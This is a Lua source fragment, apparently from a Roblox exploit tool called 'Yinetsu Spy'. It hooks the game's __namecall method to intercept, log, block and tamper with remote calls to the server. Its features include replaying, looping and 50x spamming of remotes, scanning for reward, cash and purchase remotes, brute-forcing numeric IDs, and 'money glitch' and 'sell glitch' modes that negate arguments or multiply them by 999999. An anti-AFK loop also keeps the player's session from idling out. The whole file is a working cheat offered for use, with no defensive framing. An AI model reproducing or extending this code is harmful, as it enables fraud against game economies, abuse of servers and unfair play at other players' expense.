local CodeView = Instance.new("TextBox", CodeContainer)
CodeView.Name = "CodeView"
CodeView.Size = UDim2.new(1, 0, 1, 0)
CodeView.BackgroundTransparency = 1
CodeView.Text = ""
CodeView.TextColor3 = Color3.fromRGB(0, 230, 255)
CodeView.TextSize = 9
CodeView.MultiLine = true
CodeView.ClearTextOnFocus = false
CodeView.TextXAlignment = Enum.TextXAlignment.Left
CodeView.TextYAlignment = Enum.TextYAlignment.Top
CodeView.AutomaticSize = Enum.AutomaticSize.XY

-- [[ CORE LOGIC ]]
local function getNameColor(name)
    if name:lower():match("ban") or name:lower():match("kick") or name:lower():match("detect") or name:lower():match("admin") then
        return Color3.fromRGB(255, 50, 50)
    end
    local hash = 0
    for i = 1, #name do
        hash = string.byte(name, i) + (hash * 31)
    end
    return Color3.fromHSV((math.abs(hash) % 100) / 100, 0.65, 0.85)
end

local function clearLogsFunc()
    for _, v in pairs(LogFrame:GetChildren()) do
        if v:IsA("TextButton") then v:Destroy() end
    end
    remoteLogs = {}
    logQueue = {}
    layoutOrderNum = 999999999
end

local function updateLogHighlights()
    for key, entry in pairs(remoteLogs) do
        local isSelected = false
        if multiMode then
            for _, item in ipairs(multiList) do
                if item.key == key then isSelected = true break end
            end
        end
        if entry.button and entry.button.Parent then
            entry.button.BackgroundColor3 = isSelected and Color3.fromRGB(0, 200, 100) or entry.origCol
        end
    end
end

local function updateMultiCode()
    local fullCode = "-- Multi Code Output\n"
    for _, item in ipairs(multiList) do
        local argString = v2s(item.args)
        -- تم التصحيح لاستخدام GetFullName() بدلاً من الثبات على ReplicatedStorage
        fullCode = fullCode .. string.format("%s:%s(unpack(%s))\n", item.remote:GetFullName(), (item.remote.ClassName == "RemoteEvent" and "FireServer" or "InvokeServer"), argString)
    end
    CodeView.Text = fullCode
end

local function addLog(remote, args, isLoaded)
    if blacklist[remote] or blacklist[remote.Name] then return end
    if recording then
        table.insert(recordedSeq, {remote = remote, args = args})
        if #recordedSeq > 100 then table.remove(recordedSeq, 1) end
    end
    if sniperMode then
        clearLogsFunc()
        sniperMode = false
        bSniper.Text = "Sniper: OFF"
        bSniper.BackgroundColor3 = Color3.fromRGB(255, 0, 255)
    end
    if spamBlock then
        spamCount[remote] = (spamCount[remote] or 0) + 1
        if spamCount[remote] > 20 then
            blocklist[remote] = true
            CodeView.Text = "-- [YINETSU GUARD] Blocked Spammy Remote: " .. remote.Name
            return
        end
        task.delay(1, function() spamCount[remote] = 0 end)
    end

    while #logQueue >= MAX_LOGS do
        local oldestKey = table.remove(logQueue, 1)
        local entry = remoteLogs[oldestKey]
        if entry and entry.button and entry.button.Parent then
            entry.button:Destroy()
        end
        remoteLogs[oldestKey] = nil
    end

    local argString = v2s(args)
    local groupKey = remote.Name .. "|" .. argString
    -- تم التصحيح هنا لعدم حصر الـ Path في ReplicatedStorage فقط
    local generatedCode = string.format("local args = %s\n%s:%s(unpack(args))", argString, remote:GetFullName(), (remote.ClassName == "RemoteEvent" and "FireServer" or "InvokeServer"))

    if remoteLogs[groupKey] then
        local entry = remoteLogs[groupKey]
        entry.count = entry.count + 1
        if entry.button and entry.button.Parent then
            entry.button.Text = " " .. remote.Name .. " (x" .. entry.count .. ")"
            entry.button.LayoutOrder = layoutOrderNum
        end
        layoutOrderNum = layoutOrderNum - 1
        return
    end

    local b = Instance.new("TextButton", LogFrame)
    b.Name = remote.Name
    b.LayoutOrder = layoutOrderNum
    layoutOrderNum = layoutOrderNum - 1
    b.Size = UDim2.new(0.95, 0, 0, 30)
    local isDanger = remote.Name:lower():match("ban") or remote.Name:lower():match("kick")
    b.Text = " " .. remote.Name .. (isLoaded and " [LOADED]" or "") .. (isDanger and " [DANGER]" or "")
    b.BackgroundColor3 = getNameColor(remote.Name)
    b.TextColor3 = Color3.new(1, 1, 1)
    b.TextXAlignment = Enum.TextXAlignment.Left
    b.TextSize = 9
    Instance.new("UICorner", b)
    local originalColor = b.BackgroundColor3

    remoteLogs[groupKey] = {button = b, count = 1, origCol = originalColor, code = generatedCode, remote = remote, args = args}
    table.insert(logQueue, groupKey)

    b.MouseButton1Click:Connect(function()
        if multiMode then
            local idx = nil
            for i, v in ipairs(multiList) do
                if v.key == groupKey then idx = i break end
            end
            if idx then
                table.remove(multiList, idx)
                b.BackgroundColor3 = originalColor
            else
                table.insert(multiList, {remote = remote, args = args, key = groupKey})
                b.BackgroundColor3 = Color3.fromRGB(0, 200, 100)
            end
            updateMultiCode()
        else
            selectedRemote = remote
            selectedArgs = args
            CodeView.Text = generatedCode
            if EditorMain.Visible then
                EdBox.Text = yinetsuBeautify(args)
            end
        end
    end)
end

-- SEARCH
SearchBar:GetPropertyChangedSignal("Text"):Connect(function()
    local searchText = SearchBar.Text:lower()
    for key, entry in pairs(remoteLogs) do
        if entry.button and entry.button.Parent then
            local rName = entry.button.Name:lower()
            entry.button.Visible = (searchText == "" or string.find(rName, searchText, 1, true))
        end
    end
end)

-- [[ FILE REFRESH SYSTEM ]]
local function refreshFiles()
    for _, v in pairs(FileScroll:GetChildren()) do
        if v:IsA("Frame") or v:IsA("TextLabel") then v:Destroy() end
    end
    ensureFolder()
    local files = listfiles(gPath)
    for _, path in pairs(files) do
        local name = path:match("([^/]+)$")
        if name:sub(-5) == ".json" and name ~= "_autoload.json" then
            local f = Instance.new("Frame", FileScroll)
            f.Size = UDim2.new(1, 0, 0, 30)
            f.BackgroundTransparency = 1
            f.ZIndex = 52
            local lbl = Instance.new("TextLabel", f)
            lbl.Size = UDim2.new(0.7, 0, 1, 0)
            lbl.Position = UDim2.new(0, 5, 0, 0)
            lbl.Text = name:sub(1, -6)
            lbl.TextColor3 = Color3.new(1,1,1)
            lbl.TextXAlignment = Enum.TextXAlignment.Left
            lbl.BackgroundTransparency = 1
            lbl.ZIndex = 53
            local fDots = Instance.new("TextButton", f)
            fDots.Size = UDim2.new(0, 25, 0, 25)
            fDots.Position = UDim2.new(1, -30, 0, 2)
            fDots.Text = "..."
            fDots.BackgroundColor3 = Color3.fromRGB(40,40,45)
            fDots.ZIndex = 53
            Instance.new("UICorner", fDots)

            local loadConn, autoConn, delConn, scanConn
            local function disconnectCtx()
                if loadConn then loadConn:Disconnect() end
                if autoConn then autoConn:Disconnect() end
                if delConn then delConn:Disconnect() end
                if scanConn then scanConn:Disconnect() end
            end

            fDots.MouseButton1Click:Connect(function()
                ContextFrame.Visible = true
                ContextFrame.Position = UDim2.new(0, fDots.AbsolutePosition.X - Main.AbsolutePosition.X - 125, 0, fDots.AbsolutePosition.Y - Main.AbsolutePosition.Y)
                disconnectCtx()
                loadConn = btnLoad.MouseButton1Click:Connect(function()
                    local data = HttpService:JSONDecode(readfile(path))
                    for _, d in pairs(data) do
                        local r = game:GetService("ReplicatedStorage"):FindFirstChild(d.name, true)
                        if r then addLog(r, d.args, true) end
                    end
                    btnLoad.Text = "LOADED!"
                    task.wait(1)
                    btnLoad.Text = "Load File"
                    ContextFrame.Visible = false
                    disconnectCtx()
                end)
                autoConn = btnAuto.MouseButton1Click:Connect(function()
                    writefile(autoLoadPath, HttpService:JSONEncode({file = name}))
                    btnAuto.Text = "SET!"
                    task.wait(1)
                    btnAuto.Text = "Set Auto-Load"
                    ContextFrame.Visible = false
                    disconnectCtx()
                end)
                delConn = btnDel.MouseButton1Click:Connect(function()
                    delfile(path)
                    btnDel.Text = "DELETED!"
                    task.wait(0.5)
                    btnDel.Text = "Delete File"
                    ContextFrame.Visible = false
                    refreshFiles()
                    disconnectCtx()
                end)
                scanConn = btnScan.MouseButton1Click:Connect(function()
                    local data = HttpService:JSONDecode(readfile(path))
                    for _, d in pairs(data) do
                        local r = game:GetService("ReplicatedStorage"):FindFirstChild(d.name, true)
                        if r and d.args[1] and type(d.args[1]) == "number" then
                            btnScan.Text = "SCANNING..."
                            for i = 1, 50 do
                                local newArgs = {d.args[1] + i}
                                if r.ClassName == "RemoteEvent" then
                                    r:FireServer(unpack(newArgs))
                                else
                                    r:InvokeServer(unpack(newArgs))
                                end
                                task.wait(0.05)
                            end
                            btnScan.Text = "DONE!"
                        end
                    end
                    task.wait(1)
                    btnScan.Text = "Scan IDs (AI)"
                    ContextFrame.Visible = false
                    disconnectCtx()
                end)
            end)

            ContextFrame:GetPropertyChangedSignal("Visible"):Connect(function()
                if not ContextFrame.Visible then disconnectCtx() end
            end)
        end
    end
end

-- [[ CONNECTIONS ]]
bDots.MouseButton1Click:Connect(function()
    FileMenu.Visible = not FileMenu.Visible
    if FileMenu.Visible then refreshFiles() end
    ContextFrame.Visible = false
end)

bSaveFile.MouseButton1Click:Connect(function()
    multiMode = true
    bMulti.BackgroundColor3 = Color3.fromRGB(0, 120, 255)
    SavePopup.Visible = true
    SaveIn.Text = ""
    updateLogHighlights()
end)

SaveBack.MouseButton1Click:Connect(function()
    SavePopup.Visible = false
    multiMode = false
    updateLogHighlights()
end)

SaveDone.MouseButton1Click:Connect(function()
    if SaveIn.Text ~= "" and #multiList > 0 then
        local filename = SaveIn.Text:gsub("[^%w_%-]", "")
        if filename == "" then filename = "unnamed" end
        local data = {}
        for _, item in ipairs(multiList) do
            table.insert(data, {name = item.remote.Name, args = item.args})
        end
        writefile(gPath.."/"..filename..".json", HttpService:JSONEncode(data))
        SaveDone.Text = "SAVED!"
        task.wait(1)
        SavePopup.Visible = false
        multiMode = false
        for _, item in ipairs(multiList) do
            if remoteLogs[item.key] and remoteLogs[item.key].button and remoteLogs[item.key].button.Parent then
                remoteLogs[item.key].button.BackgroundColor3 = remoteLogs[item.key].origCol
            end
        end
        multiList = {}
        updateLogHighlights()
        refreshFiles()
        SaveDone.Text = "DONE"
    end
end)

b4.MouseButton1Click:Connect(function()
    if selectedRemote and selectedRemote.Parent then
        setclipboard("-- Script for: " .. selectedRemote.Name .. "\n" .. CodeView.Text)
    else
        CodeView.Text = "-- No remote selected."
    end
end)

b5.MouseButton1Click:Connect(function()
    if selectedRemote and selectedRemote.Parent then
        CodeView.Text = "-- YINETSU REMOTE INFO --\nName: "..selectedRemote.Name.."\nPath: "..selectedRemote:GetFullName().."\nClass: "..selectedRemote.ClassName.."\nArgs Count: "..#selectedArgs
    else
        CodeView.Text = "-- No remote selected."
    end
end)

bDecompile.MouseButton1Click:Connect(function()
    if selectedRemote and selectedRemote.Parent then
        local genScript = "-- [[ GENERATED BY YINETSU SPY ]]\n\n"
        genScript = genScript .. "local Remote = " .. selectedRemote:GetFullName() .. "\n"
        genScript = genScript .. "local args = " .. yinetsuBeautify(selectedArgs) .. "\n\n"
        genScript = genScript .. "Remote:" .. (selectedRemote.ClassName == "RemoteEvent" and "FireServer" or "InvokeServer") .. "(unpack(args))\n"
        CodeView.Text = genScript
    else
        CodeView.Text = "-- Select a remote first!"
    end
end)

bYT.MouseButton1Click:Connect(function()
    setclipboard("https://youtube.com/@yinetsu?si=9QWyONQPsv9pMbsk")
end)

b1.MouseButton1Click:Connect(function() setclipboard(CodeView.Text) end)

b2.MouseButton1Click:Connect(function()
    if selectedRemote and selectedRemote.Parent then
        setclipboard(selectedRemote:GetFullName())
    end
end)

b3.MouseButton1Click:Connect(function()
    if multiMode then
        for _, d in pairs(multiList) do
            task.spawn(function()
                pcall(function()
                    if d.remote and d.remote.Parent then
                        if d.remote.ClassName == "RemoteEvent" then
                            d.remote:FireServer(unpack(d.args))
                        else
                            d.remote:InvokeServer(unpack(d.args))
                        end
                    end
                end)
            end)
        end
    elseif selectedRemote and selectedRemote.Parent then
        pcall(function()
            if selectedRemote.ClassName == "RemoteEvent" then
                selectedRemote:FireServer(unpack(selectedArgs))
            else
                selectedRemote:InvokeServer(unpack(selectedArgs))
            end
        end)
    end
end)

b6.MouseButton1Click:Connect(clearLogsFunc)

b7.MouseButton1Click:Connect(function()
    if selectedRemote then blacklist[selectedRemote] = true end
end)

b8.MouseButton1Click:Connect(function()
    if selectedRemote then blacklist[selectedRemote.Name] = true end
end)

b10.MouseButton1Click:Connect(function()
    if selectedRemote then blocklist[selectedRemote] = true end
end)

b11.MouseButton1Click:Connect(function()
    if selectedRemote then blocklist[selectedRemote.Name] = true end
end)

bMulti.MouseButton1Click:Connect(function()
    multiMode = not multiMode
    bMulti.BackgroundColor3 = multiMode and Color3.fromRGB(0, 120, 255) or Color3.fromRGB(50, 50, 60)
    if not multiMode then
        multiList = {}
        CodeView.Text = ""
    end
    updateLogHighlights()
end)

bClearMulti.MouseButton1Click:Connect(function()
    multiList = {}
    CodeView.Text = ""
    updateLogHighlights()
end)

bOpenEd.MouseButton1Click:Connect(function()
    EditorMain.Visible = true
    if selectedArgs then
        EdBox.Text = yinetsuBeautify(selectedArgs)
    end
end)

bToggleEBtn.MouseButton1Click:Connect(function()
    ToggleEdBtn.Visible = not ToggleEdBtn.Visible
    bToggleEBtn.Text = ToggleEdBtn.Visible and "Editor Icon: ON" or "Editor Icon: OFF"
    bToggleEBtn.BackgroundColor3 = ToggleEdBtn.Visible and Color3.fromRGB(150, 50, 200) or Color3.fromRGB(100, 50, 150)
end)

b9.MouseButton1Click:Connect(function()
    looping = not looping
    b9.Text = looping and "STOP" or "Loop"
    task.spawn(function()
        while looping and getgenv().YinetsuUIActive do
            if multiMode then
                for _, d in pairs(multiList) do
                    task.spawn(function()
                        pcall(function()
                            if d.remote and d.remote.Parent then
                                if d.remote.ClassName == "RemoteEvent" then
                                    d.remote:FireServer(unpack(d.args))
                                else
                                    d.remote:InvokeServer(unpack(d.args))
                                end
                            end
                        end)
                    end)
                end
            elseif selectedRemote and selectedRemote.Parent then
                pcall(function()
                    if selectedRemote.ClassName == "RemoteEvent" then
                        selectedRemote:FireServer(unpack(selectedArgs))
                    else
                        selectedRemote:InvokeServer(unpack(selectedArgs))
                    end
                end)
            end
            task.wait(tonumber(SpeedBox.Text) or 0.1)
        end
    end)
end)

b13.MouseButton1Click:Connect(function()
    autoClear = not autoClear
    b13.Text = autoClear and "STOP CLR" or "Loop Clr"
    task.spawn(function()
        while autoClear and getgenv().YinetsuUIActive do
            clearLogsFunc()
            task.wait(tonumber(ClearSpeedBox.Text) or 1)
        end
    end)
end)

local playingSeq = false
bPlaySeq.MouseButton1Click:Connect(function()
    if #recordedSeq == 0 then return end
    playingSeq = not playingSeq
    bPlaySeq.Text = playingSeq and "STOP SEQ" or "Play Seq"
    bPlaySeq.Parent.BackgroundColor3 = playingSeq and Color3.fromRGB(0, 200, 0) or Color3.fromRGB(100, 255, 100)
    task.spawn(function()
        while playingSeq and getgenv().YinetsuUIActive do
            for _, item in ipairs(recordedSeq) do
                if not playingSeq then break end
                pcall(function()
                    if item.remote and item.remote.Parent then
                        if item.remote.ClassName == "RemoteEvent" then
                            item.remote:FireServer(unpack(item.args))
                        else
                            item.remote:InvokeServer(unpack(item.args))
                        end
                    end
                end)
                task.wait(tonumber(SeqSpeedBox.Text) or 0.1)
            end
        end
    end)
end)

b12.MouseButton1Click:Connect(function()
    looping = false
    autoClear = false
    playingSeq = false
    for pg, data in pairs(editorPages) do data.looping = false end
    getgenv().YinetsuUIActive = false
    if originalHook then
        hookmetamethod(game, "__namecall", originalHook)
    end
    FloatUI:Destroy()
    ScreenGui:Destroy()
    getgenv().YinetsuExecuted = false
end)

bClearFilters.MouseButton1Click:Connect(function()
    blacklist = {}
    blocklist = {}
    bClearFilters.Text = "Cleared!"
    task.wait(1)
    bClearFilters.Text = "Reset Filters"
end)

bBlockSpam.MouseButton1Click:Connect(function()
    spamBlock = not spamBlock
    bBlockSpam.Text = spamBlock and "Anti-Spam: ON" or "Block Spam"
    bBlockSpam.BackgroundColor3 = spamBlock and Color3.fromRGB(0, 255, 100) or Color3.fromRGB(200, 100, 0)
end)

bSpam50.MouseButton1Click:Connect(function()
    if selectedRemote and selectedRemote.Parent then
        bSpam50.Text = "SPAMMING..."
        for i = 1, 50 do
            pcall(function()
                if selectedRemote.ClassName == "RemoteEvent" then
                    selectedRemote:FireServer(unpack(selectedArgs))
                else
                    selectedRemote:InvokeServer(unpack(selectedArgs))
                end
            end)
            task.wait()
        end
        bSpam50.Text = "Spam 50x"
    else
        CodeView.Text = "-- No remote selected."
    end
end)

bRecord.MouseButton1Click:Connect(function()
    recording = not recording
    bRecord.Text = recording and "Recording..." or "Rec Seq"
    bRecord.BackgroundColor3 = recording and Color3.fromRGB(255, 0, 0) or Color3.fromRGB(255, 100, 100)
    if recording then
        recordedSeq = {}
    end
end)

bMakeScript.MouseButton1Click:Connect(function()
    if #recordedSeq == 0 then
        bMakeScript.Text = "Empty!"
        task.wait(1)
        bMakeScript.Text = "Make Script"
        return
    end
    local finalScript = "-- [[ GENERATED BY YINETSU EDITOR ]]\n\n"
    finalScript = finalScript .. "local VirtualUser = game:GetService('VirtualUser')\n"
    finalScript = finalScript .. "game:GetService('RunService').Stepped:Connect(function()\n"
    finalScript = finalScript .. "    VirtualUser:CaptureController()\n"
    finalScript = finalScript .. "    VirtualUser:ClickButton2(Vector2.new())\n"
    finalScript = finalScript .. "end)\n\n"
    finalScript = finalScript .. "local running = true  -- set to false to stop loop\n"
    finalScript = finalScript .. "while running and task.wait(0.1) do\n"
    for _, item in ipairs(recordedSeq) do
        local args = v2s(item.args)
        local call = (item.remote.ClassName == "RemoteEvent" and "FireServer" or "InvokeServer")
        -- تصحيح مسار الـ Remote هنا أيضاً ليعمل بشكل ديناميكي
        finalScript = finalScript .. string.format("    %s:%s(unpack(%s))\n", item.remote:GetFullName(), call, args)
    end
    finalScript = finalScript .. "end"
    setclipboard(finalScript)
    bMakeScript.Text = "COPIED!"
    task.wait(1)
    bMakeScript.Text = "Make Script"
end)

bSniper.MouseButton1Click:Connect(function()
    sniperMode = not sniperMode
    bSniper.Text = sniperMode and "SNIPER: ON" or "Sniper: OFF"
    bSniper.BackgroundColor3 = sniperMode and Color3.fromRGB(0, 255, 0) or Color3.fromRGB(255, 0, 255)
    if sniperMode then clearLogsFunc() end
end)

bModToggle.MouseButton1Click:Connect(function()
    modifierActive = not modifierActive
    bModToggle.Text = modifierActive and "MOD: ON" or "MOD: OFF"
    bModToggle.BackgroundColor3 = modifierActive and Color3.fromRGB(0, 200, 0) or Color3.fromRGB(150, 40, 40)
end)

bCheatMenu.MouseButton1Click:Connect(function() CheatFrame.Visible = not CheatFrame.Visible end)
bCloseCheats.MouseButton1Click:Connect(function() CheatFrame.Visible = false end)

bNegate.MouseButton1Click:Connect(function()
    negateActive = not negateActive
    bNegate.Text = negateActive and "NEGATE ARGS: ON" or "NEGATE ARGS (Money Glitch)"
    bNegate.BackgroundColor3 = negateActive and Color3.fromRGB(0, 255, 0) or Color3.fromRGB(50, 50, 60)
end)

bMultiply.MouseButton1Click:Connect(function()
    multActive = not multActive
    bMultiply.Text = multActive and "MULTIPLY: ON" or "MULTIPLY x9999 (Sell Glitch)"
    bMultiply.BackgroundColor3 = multActive and Color3.fromRGB(0, 255, 0) or Color3.fromRGB(50, 50, 60)
end)

bScanner.MouseButton1Click:Connect(function()
    bScanner.Text = "SCANNING..."
    local found = 0
    local targets = {"Reward", "Claim", "Cash", "Money", "Collect", "Buy", "Purchase"}
    local function scan(inst)
        for _, v in pairs(inst:GetDescendants()) do
            if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then
                for _, key in pairs(targets) do
                    if v.Name:match(key) then
                        addLog(v, {"[YINETSU SCAN FOUND]"}, true)
                        found = found + 1
                    end
                end
            end
        end
    end
    scan(ReplicatedStorage)
    scan(workspace)
    bScanner.Text = "FOUND: " .. found
    task.wait(2)
    bScanner.Text = "SCAN REWARD REMOTES"
end)

bScanAll.MouseButton1Click:Connect(function()
    bScanAll.Text = "SCANNING..."
    local filter = SearchBar.Text:lower()
    local count = 0
    local scanned = {}
    local function scanAll(inst)
        for _, v in pairs(inst:GetDescendants()) do
            if (v:IsA("RemoteEvent") or v:IsA("RemoteFunction")) and not scanned[v] then
                scanned[v] = true
                if filter == "" or v.Name:lower():find(filter, 1, true) then
                    addLog(v, {"[AUTO SCAN]"}, true)
                    count = count + 1
                end
            end
        end
    end
    scanAll(ReplicatedStorage)
    scanAll(workspace)
    scanAll(Players)
    bScanAll.Text = "ADDED " .. count
    task.wait(1.5)
    bScanAll.Text = "Scan All"
end)

bRunAllLogs.MouseButton1Click:Connect(function()
    bRunAllLogs.Text = "RUNNING..."
    local logsToRun = {}
    for key, entry in pairs(remoteLogs) do
        if entry.remote and entry.remote.Parent then
            table.insert(logsToRun, {remote = entry.remote, args = entry.args})
        end
    end
    for i, item in ipairs(logsToRun) do
        pcall(function()
            if item.remote.ClassName == "RemoteEvent" then
                item.remote:FireServer(unpack(item.args))
            else
                item.remote:InvokeServer(unpack(item.args))
            end
        end)
        if i % 10 == 0 then task.wait() end
    end
    bRunAllLogs.Text = "FINISHED"
    task.wait(1)
    bRunAllLogs.Text = "Run All Logs"
end)

-- [[ ULTIMATE MODIFIER HOOK (OPTIMIZED) ]]
local originalHook = nil
local hookSuccess, hookError = pcall(function()
    originalHook = hookmetamethod(game, "__namecall", function(self, ...)
        local method = getnamecallmethod()
        if getgenv().YinetsuExecuted and not checkcaller() and (method == "FireServer" or method == "InvokeServer") then
            if blocklist[self] or blocklist[self.Name] then
                if method == "InvokeServer" then return coroutine.yield() end
                return nil
            end
            
            local n = self.Name:lower()
            -- تم إصلاح المنطق هنا ليتم تمرير دوال الحركة للأصل بدلاً من إرجاع nil
            if n == "update" or n == "motion" or n == "idle" or n == "move" or n == "mousemove" then
                return originalHook(self, ...)
            end
            
            local args = {...}
            local signalModified = false

            if modifierActive or negateActive or multActive then
                local targetIsSet = (cachedModTarget ~= "")
                for i, v in ipairs(args) do
                    local valType = type(v)
                    
                    if modifierActive and targetIsSet and tostring(v) == cachedModTarget then
                        if valType == "number" then
                            local numOverride = tonumber(cachedModReplace)
                            if numOverride then args[i] = numOverride; signalModified = true end
                        elseif valType == "boolean" then
                            if cachedModReplace:lower() == "true" then args[i] = true; signalModified = true
                            elseif cachedModReplace:lower() == "false" then args[i] = false; signalModified = true end
                        else
                            args[i] = cachedModReplace; signalModified = true
                        end
                    end

                    if type(args[i]) == "number" then 
                        if negateActive and args[i] > 0 then args[i] = -math.abs(args[i]); signalModified = true end
                        if multActive then args[i] = args[i] * 999999; signalModified = true end
                    end
                end
            end

            table.insert(scheduled, {remote = self, args = args})
            if signalModified then return originalHook(self, unpack(args)) end
        end
        return originalHook(self, ...)
    end)
end)

if not hookSuccess then
    warn("Yinetsu: Failed to hook __namecall: " .. tostring(hookError))
end

-- Heartbeat processor
RunService.Heartbeat:Connect(function()
    while #scheduled > 0 do
        local data = table.remove(scheduled, 1)
        addLog(data.remote, data.args, false)
    end
    if LogFrame and LogFrame.Parent then
        LogFrame.CanvasSize = UDim2.new(0, 0, 0, LogLayout.AbsoluteContentSize.Y)
    end
end)

ToggleBtn.MouseButton1Click:Connect(function()
    Main.Visible = not Main.Visible
end)

-- Memory-safe rainbow loop (NEW)
local hue = 0
local rainbowConn
rainbowConn = RunService.RenderStepped:Connect(function(dt)
    if not getgenv().YinetsuUIActive then rainbowConn:Disconnect() return end
    hue = (hue + dt * 0.2) % 1
    local rainbow = Color3.fromHSV(hue, 0.7, 1)
    if MainStroke and MainStroke.Parent then MainStroke.Color = rainbow end
    if ToggleStroke and ToggleStroke.Parent then ToggleStroke.Color = rainbow end
    if CodeStroke and CodeStroke.Parent then CodeStroke.Color = rainbow end
    if Title and Title.Parent then Title.TextColor3 = rainbow end
    if EdStroke and EdStroke.Parent then EdStroke.Color = rainbow end
    if CheatStroke and CheatStroke.Parent then CheatStroke.Color = rainbow end
    if ToggleEdStroke and ToggleEdStroke.Parent then ToggleEdStroke.Color = rainbow end
end)

-- Auto-load check
if isfile(autoLoadPath) then
    local autoData = HttpService:JSONDecode(readfile(autoLoadPath))
    local fPath = gPath .. "/" .. autoData.file
    if isfile(fPath) then
        local data = HttpService:JSONDecode(readfile(fPath))
        for _, d in pairs(data) do
            local r = game:GetService("ReplicatedStorage"):FindFirstChild(d.name, true)
            if r then addLog(r, d.args, true) end
        end
        CodeView.Text = "-- [AUTO LOADED]: " .. autoData.file
    end
end

-- Anti-AFK
task.spawn(function()
    while getgenv().YinetsuUIActive and task.wait(120) do
        pcall(function()
            VirtualUser:Button2Down(Vector2.new(0,0), workspace.CurrentCamera.CFrame)
            task.wait(0.2)
            VirtualUser:Button2Up(Vector2.new(0,0), workspace.CurrentCamera.CFrame)
        end)
    end -- تم إضافة هذه الإغلاقات المفقودة
end)
